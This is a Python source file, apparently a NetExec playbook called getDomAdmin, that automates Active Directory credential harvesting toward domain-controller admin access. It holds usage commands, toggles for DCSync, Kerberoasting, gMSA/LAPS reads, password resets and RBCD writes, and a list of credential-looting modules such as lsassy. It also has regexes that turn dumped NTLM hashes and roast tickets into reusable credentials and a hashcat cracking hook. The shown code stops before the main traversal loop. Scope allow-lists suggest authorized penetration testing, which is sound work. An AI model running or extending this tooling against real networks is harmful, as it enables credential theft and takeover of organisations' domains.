r"""getDomAdmin — a fixpoint credential-harvesting attack-graph playbook.

Goal: starting from nothing or one credential, collect credentials and traverse
explicitly allowed hosts toward verified administrator access on a domain
controller. Stop on the first verified Tier Zero path by default.

How it thinks
-------------
The engine models the engagement as a graph whose NODES are (credential, host)
reach-states and whose EDGES are techniques that turn one state into new secrets,
new hosts, or new privileges (local-admin password reuse, LAPS/gMSA reads,
roasting + cracking, delegation, ADCS, DPAPI, SAM/LSA/LSASS, NTDS/DCSync, ...).

It runs a worklist / spanning-tree traversal: every (credential, target, technique)
triple is attempted at most once, so the graph is explored without looping — but
the moment a technique yields a NEW credential (or host, or privilege), fresh
triples are enqueued and the loop "goes in on itself", re-trying the whole decision
tree with the new knowledge. The loop reaches a fixpoint (saturation) when a full
pass discovers nothing new, or when a safety budget is hit.

Credential discovery reads new or changed rows from NetExec's workspace database
(NetExec aggregates SAM/LSA/NTDS/DPAPI/etc. into it); typed gMSA results and logged secrets
(roast hashes, GPP/LAPS/app-loot) are
additionally harvested from step output and — where a cracker is available — cracked
back into plaintext that feeds the loop again.

Everything is logged, verbosely, especially errors (full tracebacks), to a per-run
log file and a JSONL event stream under NXC_PATH/logs, plus a final attack-path
report describing exactly how each credential (and Domain Admin) was obtained.

Usage (NetExec standard: protocol/playbook, then host, then the playbook path)
-----------------------------------------------------------------------------
    # unauthenticated start; list each additional in-scope host explicitly
    nxc playbook <seed_or_DC> examples/playbooks/getDomAdmin.py \
        -d DOMAIN --dns-server <DNS_IP> --allow-target <DNS_IP> <host_1> <host_2>

    # start from one credential (password / NT hash / Kerberos)
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -p PASS \
        -d DOMAIN --dns-server <DNS_IP> --allow-target <DNS_IP> <host_1> <host_2>
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -H NTHASH -d DOMAIN ...
    nxc playbook <DC_IP> examples/playbooks/getDomAdmin.py -u USER -p PASS -k \
        --dns-server <DC_IP> --kdcHost <DC_IP>

Only targets supplied to ``nxc playbook`` and exact hosts listed with
``--allow-target`` are touched. Pass ``--dns-server`` and list that exact server
as a literal IP in ``--allow-target``; this prevents implicit use of the system resolver.
The playbook does not expand discovered hosts into new targets. Do not pass a range
unless that entire range is authorized. This playbook can collect credentials and
download readable share contents. ADCS is enumeration-only; certificate requests,
relay, and network poisoning are not implemented. Do not run concurrent NetExec
clients in one workspace because its credential database does not track per-run provenance.

Toggles (environment variables)
-------------------------------
    GETDA_WORDLIST=/path/to/wordlist   crack roast/NTLM hashes (default: rockyou if present)
    GETDA_STOP_ON_DA=0                 continue after computed Domain Admin proof (default: stop)
    GETDA_STOP_ON_TIER_ZERO=0          continue after verified DC administrator access (default: stop)
    GETDA_ENABLE_ADCS=1               enable NetExec LDAP ADCS enumeration (default: off)
    GETDA_ENABLE_LAPS=1               read LAPS data (default: off; requires allowed --dns-server)
    GETDA_ENABLE_GMSA=1               read gMSA keys and queue usable credentials (default: off)
    GETDA_ENABLE_ACL=0                skip read-only domain/group ACL assessment (default: on)
    GETDA_ENABLE_GROUP_WRITES=1       try exact-DN privileged-group membership candidates (default: off)
    GETDA_RESET_TARGET_USER=USER|auto  assess an exact user or nested Domain Admin users for reset rights
    GETDA_ENABLE_PASSWORD_RESET=1     attempt a permitted reset and requeue the new credential (default: off)
    GETDA_MAX_AUTO_RESET_TARGETS=12    cap automatic candidate DACL reads
    GETDA_ENABLE_MACHINE_CREATE=1     create one machine account when quota permits (default: off)
    GETDA_RBCD_TARGET_ACCOUNT=HOST$   assess only this computer (default: observed allowed hosts)
    GETDA_ENABLE_RBCD_WRITE=1         add the created machine's RBCD grant when eligible (default: off)
    GETDA_ENABLE_DOMAIN_SECRETS=1     enable gMSA and NTDS/DCSync (default: off)
    GETDA_ENABLE_LOOT=1               enable on-host credential-looting modules (default: off)
    GETDA_ENABLE_SCCM=1               resolve SCCM hostnames through an allowed --dns-server (default: off)
    GETDA_ENABLE_SPIDER=1             download readable SMB share files (default: off)
    GETDA_ENABLE_KERBEROS_PROBES=1    enable roast/pre2k requests (default: off; requires in-scope IP --kdcHost)
    GETDA_ENABLE_DELEGATION_TICKETS=1  request S4U tickets for eligible login accounts (default: off)
    GETDA_DELEGATE_USER=USER           user to impersonate for that explicit ticket branch
    GETDA_ENABLE_SQL_DUMP=1           dump MSSQL database rows (default: off)
    GETDA_MAX_STEPS=4000              hard cap on total technique executions (safety backstop)
    GETDA_MAX_ROUNDS=40               hard cap on fixpoint rounds
    GETDA_PROBE_TIMEOUT=25            soft wait limit before logging; wait for active work to finish
    GETDA_TOOL_TIMEOUT=600            per external-tool invocation timeout (s)

External tool dependency list
-----------------------------
All are OPTIONAL; each is probed at start and the run degrades gracefully (and logs)
when one is missing. The in-code ``DEPENDENCIES`` manifest below is the source of
truth and is printed in the preflight report.

    impacket             pip install impacket         secretsdump / GetUserSPNs / GetNPUsers / getTGT fallbacks
    hashcat              apt install hashcat           crack roast/AS-REP/NTLM -> plaintext (feeds the loop)
    john                 apt install john              cracker fallback

The playbook can collect passwords and hashes. Domain-secret reads (gMSA,
password-bearing LDAP attributes, and NTDS/DCSync), file downloads,
credential-looting modules, ADCS enumeration, LAPS reads, Kerberos
roasting/pre2k requests, SCCM hostname resolution, and SQL row dumps require
explicit toggles. LAPS and SCCM require an allowed --dns-server. LAPS encrypted
values can also trigger RPC. Kerberos probes require an explicit --kdcHost that
exactly matches an allowed target and uses a literal IP. The playbook does not
run external Certipy discovery, BloodHound, certificate requests, relay, or
poisoning because those paths can reach systems beyond the explicit host list.
"""

import contextlib
from ipaddress import ip_address
import os
import re
import secrets
import shutil
import sqlite3
import subprocess
import threading
import traceback
from time import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from ldap3.utils.conv import escape_filter_chars
from nxc.config import nxc_workspace
from nxc.paths import NXC_PATH, WORKSPACE_DIR
from nxc.playbooks.access import assess_dacl


# --------------------------------------------------------------------------- #
# configuration / safety budgets (overridable via environment)
# --------------------------------------------------------------------------- #
def _env_int(name, default):
    try:
        return int(os.environ.get(name, "").strip() or default)
    except ValueError:
        return default


def _env_on(name, default):
    raw = os.environ.get(name, "").strip().lower()
    if raw in ("1", "true", "yes", "on"):
        return True
    if raw in ("0", "false", "no", "off"):
        return False
    return default


MAX_STEPS = _env_int("GETDA_MAX_STEPS", 4000)
MAX_ROUNDS = _env_int("GETDA_MAX_ROUNDS", 40)
PROBE_TIMEOUT = _env_int("GETDA_PROBE_TIMEOUT", 25)
TOOL_TIMEOUT = _env_int("GETDA_TOOL_TIMEOUT", 600)
KERBEROS_CACHE_LOCK = threading.Lock()
STOP_ON_DA = _env_on("GETDA_STOP_ON_DA", True)
STOP_ON_TIER_ZERO = _env_on("GETDA_STOP_ON_TIER_ZERO", True)
ENABLE_DELEGATION_TICKETS = _env_on("GETDA_ENABLE_DELEGATION_TICKETS", False)
DELEGATE_USER = os.environ.get("GETDA_DELEGATE_USER", "").strip()
ENABLE_ADCS = _env_on("GETDA_ENABLE_ADCS", False)
ENABLE_LAPS = _env_on("GETDA_ENABLE_LAPS", False)
ENABLE_GMSA = _env_on("GETDA_ENABLE_GMSA", False)
ENABLE_ACL = _env_on("GETDA_ENABLE_ACL", True)
ENABLE_GROUP_WRITES = _env_on("GETDA_ENABLE_GROUP_WRITES", False)
RESET_TARGET_USER = os.environ.get("GETDA_RESET_TARGET_USER", "").strip()
ENABLE_PASSWORD_RESET = _env_on("GETDA_ENABLE_PASSWORD_RESET", False)
MAX_AUTO_RESET_TARGETS = max(0, _env_int("GETDA_MAX_AUTO_RESET_TARGETS", 12))
ENABLE_MACHINE_CREATE = _env_on("GETDA_ENABLE_MACHINE_CREATE", False)
RBCD_TARGET_ACCOUNT = os.environ.get("GETDA_RBCD_TARGET_ACCOUNT", "").strip()
ENABLE_RBCD_WRITE = _env_on("GETDA_ENABLE_RBCD_WRITE", False)
ENABLE_DOMAIN_SECRETS = _env_on("GETDA_ENABLE_DOMAIN_SECRETS", False)
ENABLE_LOOT = _env_on("GETDA_ENABLE_LOOT", False)
ENABLE_SPIDER = _env_on("GETDA_ENABLE_SPIDER", False)
ENABLE_KERBEROS_PROBES = _env_on("GETDA_ENABLE_KERBEROS_PROBES", False)
ENABLE_SCCM = _env_on("GETDA_ENABLE_SCCM", False)
ENABLE_SQL_DUMP = _env_on("GETDA_ENABLE_SQL_DUMP", False)
SPIDER_MAX = 128 * 1024 * 1024  # per-file cap when share downloads are enabled

# On-host application-credential loot modules, highest value first. Each is run
# (guarded) once we hold local admin on a host; results land in NetExec's DB or
# are harvested from step output.
LOOT_MODULES = (
    "lsassy", "gpp_password", "gpp_autologin", "reg-winlogon", "wdigest",
    "winscp", "putty", "mremoteng", "rdcman", "mobaxterm", "vnc", "wifi",
    "rclone", "veeam", "keepass_discover", "powershell_history", "iis",
    "msol", "wam", "teams_localdb", "security-questions", "eventlog_creds",
)

# External tool dependency manifest (source of truth for the preflight report).
DEPENDENCIES = {
    "impacket-secretsdump": {"pkg": "impacket (pip)", "use": "SAM/LSA/NTDS dump fallback", "bins": ("secretsdump.py", "impacket-secretsdump")},
    "impacket-getuserspns": {"pkg": "impacket (pip)", "use": "Kerberoast fallback", "bins": ("GetUserSPNs.py", "impacket-GetUserSPNs")},
    "impacket-getnpusers": {"pkg": "impacket (pip)", "use": "AS-REP roast fallback", "bins": ("GetNPUsers.py", "impacket-GetNPUsers")},
    "impacket-gettgt": {"pkg": "impacket (pip)", "use": "request TGT from recovered key", "bins": ("getTGT.py", "impacket-getTGT")},
    "hashcat": {"pkg": "hashcat (apt)", "use": "crack roast/AS-REP/NTLM -> plaintext", "bins": ("hashcat",)},
    "john": {"pkg": "john (apt)", "use": "cracker fallback", "bins": ("john",)},
}


# --------------------------------------------------------------------------- #
# logging — verbose, per-run, to stdout + a log file + a JSONL event stream
# --------------------------------------------------------------------------- #
class Log:
    """Dead-simple, dependency-free, thread-safe structured logger.

    Writes human lines to stdout and a .log file, and one JSON object per event to
    a .jsonl file, so the whole run can be replayed/parsed afterwards.
    """

    LEVELS = {"DEBUG": 10, "INFO": 20, "STEP": 25, "GOOD": 30, "WARN": 35, "ERROR": 40, "CRIT": 50}

    def __init__(self, target):
        self._lock = threading.Lock()
        stamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", str(target))
        logdir = os.path.join(NXC_PATH, "logs")
        try:
            os.makedirs(logdir, exist_ok=True)
        except OSError:
            logdir = NXC_PATH
        self.base = os.path.join(logdir, f"getDomAdmin_{safe}_{stamp}")
        self._log = self._open(self.base + ".log")
        self._jsonl = self._open(self.base + ".jsonl")

    @staticmethod
    def _open(path):
        try:
            return open(path, "a", encoding="utf-8")
        except OSError:
            return None

    def _emit(self, level, msg, **fields):
        line = f"{datetime.now().strftime('%H:%M:%S')} [{level:<5}] {msg}"
        with self._lock:
            print(f"  [getDA] {line}", flush=True)
            for handle in (self._log,):
                if handle:
                    try:
                        handle.write(line + "\n")
                        handle.flush()
                    except OSError:
                        pass
            if self._jsonl:
                try:
                    payload = {"ts": datetime.now().isoformat(), "level": level, "msg": msg, **fields}
                    self._jsonl.write(_json_min(payload) + "\n")
                    self._jsonl.flush()
                except OSError:
                    pass

    def debug(self, msg, **f): self._emit("DEBUG", msg, **f)
    def info(self, msg, **f): self._emit("INFO", msg, **f)
    def step(self, msg, **f): self._emit("STEP", msg, **f)
    def good(self, msg, **f): self._emit("GOOD", msg, **f)
    def warn(self, msg, **f): self._emit("WARN", msg, **f)
    def error(self, msg, **f): self._emit("ERROR", msg, **f)
    def crit(self, msg, **f): self._emit("CRIT", msg, **f)

    def exception(self, context, exc):
        """Log an exception with its full traceback — errors must never be silent."""
        tb = "".join(traceback.format_exception(type(exc), exc, exc.__traceback__))
        self._emit("ERROR", f"{context}: {type(exc).__name__}: {exc}")
        with self._lock:
            if self._log:
                try:
                    self._log.write(tb + "\n")
                    self._log.flush()
                except OSError:
                    pass

    def close(self):
        for handle in (self._log, self._jsonl):
            if handle:
                with contextlib.suppress(OSError):
                    handle.close()


def _json_min(obj):
    """Tiny JSON encoder (stdlib json is fine, but keep values string-safe)."""
    import json
    try:
        return json.dumps(obj, default=str)
    except (TypeError, ValueError):
        return json.dumps({k: str(v) for k, v in obj.items()}, default=str)


# --------------------------------------------------------------------------- #
# data model: credentials, the knowledge base, and the worklist
# --------------------------------------------------------------------------- #
@dataclass(frozen=True)
class Cred:
    """One credential. ``secret`` is a password, an ``lm:nt`` (or ``:nt``) hash,
    an AES key, or a service ccache; ``kind`` is plaintext/hash/aes/ccache.
    """

    domain: str
    username: str
    secret: str
    kind: str = "plaintext"
    local: bool = False  # a local account -> try with --local-auth
    source: str = "seed"  # how it was obtained (for the attack-path report)
    target_scope: str | None = None  # optional single-host binding for host-local secrets
    protocols: tuple[str, ...] | None = None  # optional protocol restriction
    kdc_host: str | None = None  # exact allowed KDC used with a service ccache
    db_ref: tuple[str, int] | None = None  # reusable NetExec protocol database row
    expires_at: int | None = None  # Unix end time for delegated service tickets

    def key(self):
        secret = self.secret.lower() if self.kind in ("hash", "aes") and isinstance(self.secret, str) else self.secret
        return (self.domain.lower(), self.username.lower(), secret, self.kind, self.local,
                self.target_scope, self.protocols, self.kdc_host, self.db_ref, self.expires_at)

    def label(self):
        shown = (f"{self.db_ref[0]}-db:{self.db_ref[1]}" if self.db_ref else self.secret
                 if self.kind == "plaintext" else f"{self.kind}:{self.secret[:12]}…")
        scope = "local" if self.local else (self.domain or "?")
        return f"{scope}\\{self.username} ({shown})"

    def principal(self):
        return f"{self.domain}\\{self.username}" if self.domain else self.username

    def login_kwargs(self, default_domain):
        """NetExec connect() kwargs for authenticating as this credential."""
        opts = {"username": [self.username]}
        dom = self.domain or (default_domain if not self.local else "") or ""
        if self.local:
            opts["local_auth"] = True
            if dom:
                opts["domain"] = dom
        elif dom:
            opts["domain"] = dom
        if self.kind == "plaintext":
            opts["password"] = [self.secret]
        elif self.kind == "hash":
            opts["hash"] = [self.secret]
        elif self.kind == "aes":
            opts["aesKey"] = [self.secret] if isinstance(self.secret, str) else self.secret
            opts["kerberos"] = True
        elif self.kind == "ccache":
            opts["kerberos"] = True
            opts["use_kcache"] = True
            opts["kdcHost"] = self.kdc_host
        return opts


def host_role(facts):
    if facts.get("dc") is True:
        return "domain_controller"
    os_name = str(facts.get("os") or "").casefold()
    if "windows" not in os_name:
        return "unknown"
    return "server" if "server" in os_name else "workstation"


ROLE_PRIORITY = {"domain_controller": 0, "server": 1, "workstation": 2, "unknown": 3}
DOMAIN_CONTROLLERS_PRIMARY_GROUP_RID = 516
DELEGATED_SERVICE_PROTOCOLS = {"cifs": ("smb",), "ldap": ("ldap",), "mssqlsvc": ("mssql",)}


@dataclass
class KB:
    """Shared knowledge base for one run (not module-global: one per run())."""

    log: "Log"
    default_domain: str = ""
    dns_server: str = ""
    kdc_host: str = ""
    seed_target: str = ""
    creds: dict = field(default_factory=dict)          # key -> Cred
    hosts: dict = field(default_factory=dict)           # ip/name -> facts dict
    observed_hostnames: dict = field(default_factory=dict)  # live identity aliases keyed by allowed target
    state_parents: dict = field(default_factory=dict)
    current_state: tuple | None = None
    credential_paths: dict = field(default_factory=dict)
    access_edges: list = field(default_factory=list)
    relationship_edges: list = field(default_factory=list)
    acl_assessments: list = field(default_factory=list)
    password_reset_targets: set = field(default_factory=set)
    password_reset_attempted: bool = False
    machine_account_created: bool = False
    machine_account_actions: list = field(default_factory=list)
    rbcd_grant_completed: bool = False
    tier_zero_reached: bool = False
    tier_zero_proof: str = ""
    tier_zero_path: list = field(default_factory=list)
    tier_zero_material: list = field(default_factory=list)
    delegation_edges: list = field(default_factory=list)
    delegation_tickets: list = field(default_factory=list)
    delegation_candidates: list = field(default_factory=list)
    sql_edges: list = field(default_factory=list)
    allowed: set = field(default_factory=set)           # targets we may touch
    admin_edges: set = field(default_factory=set)       # (cred_key, target)
    sessions: set = field(default_factory=set)          # (user, host) observed logons
    done: set = field(default_factory=set)              # (scope, technique) spanning-tree visited set
    worklist: list = field(default_factory=list)        # pending (cred, target) states
    queued: set = field(default_factory=set)            # (cred_key, target) already enqueued
    findings: list = field(default_factory=list)        # human notes / edges for the report
    roast_files: set = field(default_factory=set)       # files of $krb5* hashes to crack
    tools: dict = field(default_factory=dict)           # resolved external tool paths
    baseline_credentials: dict = field(default_factory=dict)  # protocol -> ID to credential fingerprint
    steps: int = 0
    da_reached: bool = False
    da_proof: str = ""
    termination: str = "not_started"
    budget_exhausted: bool = False

    # --- credential intake ------------------------------------------------- #
    def add_cred(self, cred):
        if not cred.username or (cred.secret in (None, "") and cred.db_ref is None):
            return False
        if cred.target_scope and cred.target_scope not in self.allowed:
            return False
        if cred.kind == "ccache" and (not cred.target_scope or cred.kdc_host not in self.allowed
                                       or cred.protocols not in DELEGATED_SERVICE_PROTOCOLS.values()
                                       or not os.path.isfile(cred.secret)
                                       or (cred.expires_at is not None and cred.expires_at <= time())):
            return False
        k = cred.key()
        if k in self.creds:
            return False
        self.creds[k] = cred
        if self.current_state is None:
            origin = "workspace" if cred.source.endswith("-db") else "seed"
            self.credential_paths[k] = [{"type": origin, "principal": cred.principal(), "source": cred.source}]
        else:
            parent, target = self.current_state
            parent_path = self.credential_paths.get(parent.key(), []) if parent else []
            self.credential_paths[k] = [*parent_path, {"type": "credential", "host": target,
                                                       "technique": cred.source, "principal": cred.principal()}]
        self.log.good(f"NEW CREDENTIAL: {cred.label()}  [via {cred.source}]", cred=cred.label(), source=cred.source)
        self.findings.append(f"cred {cred.label()} via {cred.source}")
        # Host-local secrets stay on their exact source host; other credentials
        # may be tested across the explicitly allowed target set.
        targets = (cred.target_scope,) if cred.target_scope else sorted(self.allowed)
        for target in targets:
            self.enqueue(cred, target)
        if cred.username.casefold() == "krbtgt" and cred.kind == "hash":
            self.tier_zero_material.append({"domain": cred.domain, "material": "krbtgt hash", "source": cred.source})
            self.log.good("Recovered krbtgt material; DC access has not been verified")
        return True

    def add_host(self, ident, **facts):
        if not ident:
            return
        row = self.hosts.setdefault(ident, {})
        row.update({k: v for k, v in facts.items()
                    if v is not None and v != ""
                    and not (k == "dc" and row.get("dc") is True and v is False)
                    and not (k == "os" and "server" in str(row.get("os") or "").casefold() and "server" not in str(v).casefold())})
        row["role"] = host_role(row)

    def observe_host_identity(self, target, hostname):
        if target in self.allowed and hostname:
            self.observed_hostnames.setdefault(target, set()).add(str(hostname).strip().rstrip(".").casefold())

    def state_priority(self, state):
        cred, target = state
        role = self.hosts.get(target, {}).get("role", "unknown")
        return (ROLE_PRIORITY[role], target != self.seed_target, target,
                "" if cred is None else cred.principal().casefold())

    def note_access(self, cred, target, protocol, session):
        if cred is None or not getattr(session, "authenticated", False):
            return
        role = self.hosts.get(target, {}).get("role", "unknown")
        edge = {"principal": cred.principal(), "target": target, "role": role,
                "protocol": protocol, "admin": getattr(session, "admin", None) is True}
        if edge not in self.access_edges:
            self.access_edges.append(edge)
        if protocol == "smb" and role == "domain_controller" and edge["admin"] and not self.tier_zero_reached:
            self.tier_zero_reached = True
            self.tier_zero_proof = f"{cred.principal()} authenticated with administrator privileges on DC {target}"
            self.tier_zero_path = [*self.credential_paths.get(cred.key(), []), {"type": "access", **edge}]
            self.log.crit(f"TIER ZERO ACCESS VERIFIED: {self.tier_zero_proof}")

    def enqueue(self, cred, target):
        if target not in self.allowed:
            raise ValueError(f"Target {target!r} is outside this playbook's allowed targets")
        pair = (cred.key() if cred is not None else None, target)
        if pair in self.queued:
            return
        self.queued.add(pair)
        parent, parent_host = self.current_state if self.current_state is not None else (None, None)
        self.state_parents[pair] = (parent.key() if parent else None, parent_host) if parent_host else None
        self.worklist.append((cred, target))

    def visit(self, scope, technique):
        """Spanning-tree gate: return True the first time (scope, technique) is seen."""
        tag = (scope, technique)
        if tag in self.done:
            return False
        self.done.add(tag)
        return True


@dataclass
class DAReport:
    """JSON-serializable summary stored on the final host.finding()."""

    target: str
    da_reached: bool
    da_proof: str
    tier_zero_reached: bool = False
    tier_zero_proof: str = ""
    tier_zero_path: list = field(default_factory=list)
    tier_zero_material: list = field(default_factory=list)
    access_edges: list = field(default_factory=list)
    relationship_edges: list = field(default_factory=list)
    acl_assessments: list = field(default_factory=list)
    machine_account_actions: list = field(default_factory=list)
    traversal_tree: list = field(default_factory=list)
    delegation_edges: list = field(default_factory=list)
    delegation_tickets: list = field(default_factory=list)
    sql_edges: list = field(default_factory=list)
    credentials: list = field(default_factory=list)
    hosts: list = field(default_factory=list)
    admin_edges: list = field(default_factory=list)
    findings: list = field(default_factory=list)
    steps: int = 0
    log_file: str = ""
    termination: str = "not_started"
    pending_states: int = 0


# --------------------------------------------------------------------------- #
# bounded waiting — a timed-out daemon worker may still finish in the background
# --------------------------------------------------------------------------- #
def run_bounded(fn, seconds, log, what):
    """Run fn() in a daemon thread, but never reuse its session while it is active."""
    box = {"value": None}
    done = threading.Event()

    def worker():
        try:
            box["value"] = fn()
        except (Exception, SystemExit) as exc:
            box["value"] = exc
        finally:
            done.set()

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    timed_out = not done.wait(seconds)
    if timed_out:
        log.warn(f"SOFT TIMEOUT after {seconds}s: {what} — waiting for it to finish before continuing")
        thread.join()
    value = box["value"]
    if isinstance(value, (Exception, SystemExit)):
        log.error(f"step failed: {what}: {type(value).__name__}: {value}")
        log.debug("".join(traceback.format_exception(type(value), value, value.__traceback__)))
        return None, timed_out
    return value, timed_out


# --------------------------------------------------------------------------- #
# external tool framework
# --------------------------------------------------------------------------- #
def preflight_tools(kb):
    """Resolve every optional dependency once and log availability."""
    kb.log.step("Preflight: probing optional external tools (all optional, run degrades gracefully)")
    for name, meta in DEPENDENCIES.items():
        found = next((shutil.which(b) for b in meta["bins"] if shutil.which(b)), None)
        kb.tools[name] = found
        if found:
            kb.log.info(f"  [ok ] {name:22} -> {found}   ({meta['use']})")
        else:
            kb.log.info(f"  [--- ] {name:22} missing: {meta['pkg']}   ({meta['use']})")
    wl = os.environ.get("GETDA_WORDLIST", "").strip() or _default_wordlist()
    kb.tools["_wordlist"] = wl if wl and os.path.isfile(wl) else None
    kb.log.info(f"  wordlist: {kb.tools['_wordlist'] or 'none (cracking disabled)'}")


def _default_wordlist():
    for path in ("/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
                 os.path.expanduser("~/rockyou.txt")):
        if os.path.isfile(path):
            return path
    return ""


def run_tool(kb, argv, what, timeout=None, input_text=None):
    """Run an external tool with full logging; return (returncode, stdout, stderr)."""
    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return 125, "", "step budget reached"
    kb.steps += 1
    kb.log.step(f"exec tool: {what}  ::  {' '.join(str(a) for a in argv)}")
    try:
        proc = subprocess.run(
            [str(a) for a in argv],
            capture_output=True, text=True,
            timeout=timeout or TOOL_TIMEOUT, input=input_text, check=False,
        )
    except FileNotFoundError as exc:
        kb.log.error(f"tool not found for {what}: {exc}")
        return 127, "", str(exc)
    except subprocess.TimeoutExpired as exc:
        kb.log.warn(f"tool timeout ({timeout or TOOL_TIMEOUT}s) for {what}")
        return 124, exc.stdout or "", exc.stderr or ""
    except (Exception, SystemExit) as exc:
        kb.log.exception(f"tool crashed for {what}", exc)
        return 1, "", str(exc)
    if proc.stdout:
        kb.log.debug(f"{what} stdout:\n{proc.stdout.rstrip()}")
    if proc.stderr:
        kb.log.debug(f"{what} stderr:\n{proc.stderr.rstrip()}")
    kb.log.info(f"{what} exited rc={proc.returncode}")
    return proc.returncode, proc.stdout or "", proc.stderr or ""


# --------------------------------------------------------------------------- #
# NetExec result / database harvesting
# --------------------------------------------------------------------------- #
def _events_text(result):
    """Flatten every log line a NetExec action/module emitted into one string."""
    out = []
    results = getattr(result, "results", None) or [result]
    for r in results:
        out.extend(getattr(ev, "message", str(ev)) for ev in getattr(r, "events", None) or [])
        data = getattr(r, "data", None)
        out.extend(getattr(ev, "message", str(ev)) for ev in getattr(data, "events", None) or [])
    return "\n".join(m for m in out if m)


def match_laps_target(kb, record):
    """Return one exact allowed target matching a LAPS computer identity."""
    computer = str(getattr(record, "computer", "") or "").strip().rstrip("$").rstrip(".").casefold()
    dns_hostname = str(getattr(record, "dns_hostname", "") or "").strip().rstrip(".").casefold()
    identities = {value for value in (computer, dns_hostname) if value}
    matches = []
    for target in kb.allowed:
        aliases = {str(target).strip().rstrip(".").casefold(), *kb.observed_hostnames.get(target, set())}
        if aliases & identities:
            matches.append(target)
    return matches[0] if len(matches) == 1 else None


def harvest_laps_result(kb, result, domain):
    """Keep LAPS credentials local to one exactly matched host and SMB only."""
    results = getattr(result, "results", None) or [result]
    for item in results:
        data = getattr(item, "data", None)
        for record in getattr(data, "computers", None) or []:
            username = getattr(record, "username", None)
            password = getattr(record, "password", None)
            if not username or not password:
                continue
            target = match_laps_target(kb, record)
            if target is None:
                identity = getattr(record, "dns_hostname", None) or getattr(record, "computer", None) or "unknown"
                kb.findings.append(f"LAPS secret for {identity} not auto-used: no exact allowed-host match")
                continue
            kb.add_cred(Cred("", username, password, "plaintext", local=True, source="laps",
                             target_scope=target, protocols=("smb",)))


def harvest_gmsa_result(kb, result, domain):
    """Turn readable managed-service-account keys into new domain credential nodes."""
    data = getattr(result, "data", None)
    for account in getattr(data, "accounts", []) or []:
        username = getattr(account, "account", "")
        nt_hash = getattr(account, "rc4", None) if getattr(account, "password_readable", False) else None
        if username and nt_hash and re.fullmatch(r"[0-9a-fA-F]{32}", nt_hash):
            kb.add_cred(Cred(domain, username, f":{nt_hash}", "hash", source="gmsa"))
        aes256 = getattr(account, "aes256", None) if getattr(account, "password_readable", False) else None
        if username and aes256 and kb.kdc_host in kb.allowed and re.fullmatch(r"[0-9a-fA-F]{64}", aes256):
            kb.add_cred(Cred(domain, username, aes256, "aes", source="gmsa"))


# regexes for secrets that NetExec prints but does not always store in its DB
_RE_SECRETSDUMP = re.compile(r"^([^\s:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", re.M)
_RE_DOMAIN_HASH = re.compile(r"^([^\s:\\/]+(?:\\[^\s:]+)?):\d+:[0-9a-fA-F]{32}:([0-9a-fA-F]{32}):::", re.M)
_RE_KRB5TGS = re.compile(r"\$krb5tgs\$[^\s'\"]+")
_RE_KRB5ASREP = re.compile(r"\$krb5asrep\$[^\s'\"]+")
_RE_GPP = re.compile(r"(?:Username|userName)\s*[:=]\s*(?P<u>[^\s]+).*?(?:Password|cpassword|Plaintext)\s*[:=]\s*(?P<p>[^\s]+)", re.I | re.S)
_RE_USERPASS = re.compile(r"(?:Username|User|login)\s*[:=]\s*(?P<u>[^\s]+)\s+(?:Password|pass|pwd)\s*[:=]\s*(?P<p>\S+)", re.I)


def harvest_events(kb, result, source, domain):
    """Secondary harvest: pull secrets out of printed output (roast hashes to files,
    plaintext/hashes to the KB). The DB sweep is primary; this catches the rest.
    """
    if source.endswith(":laps"):
        return
    text = _events_text(result)
    if not text:
        return
    # roast / AS-REP hashes -> write to files for the cracker, and remember the SPN user
    tgs = _RE_KRB5TGS.findall(text)
    asrep = _RE_KRB5ASREP.findall(text)
    if tgs or asrep:
        path = _write_hashes(kb, source, tgs + asrep)
        if path:
            kb.roast_files.add(path)
            kb.log.good(f"captured {len(tgs)} kerberoast + {len(asrep)} AS-REP hash(es) -> {path}")
    # SAM / NTDS secretsdump-style lines
    for m in _RE_SECRETSDUMP.finditer(text):
        user, _, _lm, nt = m.group(1), m.group(2), m.group(3), m.group(4)
        local = "\\" not in user and source.startswith(("sam", "lsa"))
        dom = user.split("\\")[0] if "\\" in user else (domain if not local else "")
        uname = user.split("\\")[-1]
        kb.add_cred(Cred(dom, uname, f":{nt}", "hash", local=local, source=source))
    # GPP / generic user:pass printed by loot modules. LAPS uses its typed
    # result so the computer and local account are not mistaken for domain creds.
    for rx, note in ((_RE_GPP, "gpp"), (_RE_USERPASS, "loot")):
        for m in rx.finditer(text):
            gd = m.groupdict()
            user = gd.get("u") or gd.get("h") or ""
            pw = gd.get("p") or ""
            if user and pw and not pw.startswith("$") and len(pw) < 200:
                user = user.split("\\")[-1].rstrip("$")
                kb.add_cred(Cred(domain, user, pw, "plaintext", source=f"{source}:{note}"))


def _write_hashes(kb, source, hashes):
    try:
        path = os.path.join(kb.log.base + f".{re.sub(r'[^a-z0-9]', '', source.lower())}.hashes")
        with open(path, "a", encoding="utf-8") as fh:
            for h in hashes:
                fh.write(h + "\n")
        return path
    except OSError as exc:
        kb.log.exception("could not write hash file", exc)
        return None


def _rows(db_result):
    """Normalize a SQLAlchemy result (list of Row) into list of dicts."""
    out = []
    for row in db_result or []:
        mapping = getattr(row, "_mapping", None)
        out.append(dict(mapping) if mapping is not None else dict(enumerate(row)))
    return out


def credential_fingerprints(rows):
    """Map workspace credential IDs to their complete stored identity and secret."""
    return {
        row.get("id"): (row.get("domain"), row.get("username"), row.get("credtype"), row.get("password"))
        for row in _rows(rows)
    }


def snapshot_workspace_credentials(kb):
    """Ignore credentials that were already in the shared workspace before this run.

    The seed credential is read from the live connection separately. Fingerprints
    include the secret because NetExec updates existing rows in place.
    """
    for proto in ("smb", "ldap", "mssql"):
        path = Path(WORKSPACE_DIR) / nxc_workspace / f"{proto}.db"
        if not path.is_file():
            kb.baseline_credentials[proto] = {}
            continue
        try:
            with sqlite3.connect(f"{path.resolve().as_uri()}?mode=ro", uri=True) as conn:
                kb.baseline_credentials[proto] = {
                    row[0]: (row[1], row[2], row[3], row[4])
                    for row in conn.execute("SELECT id, domain, username, credtype, password FROM users")
                }
        except sqlite3.Error as e:
            kb.baseline_credentials[proto] = None
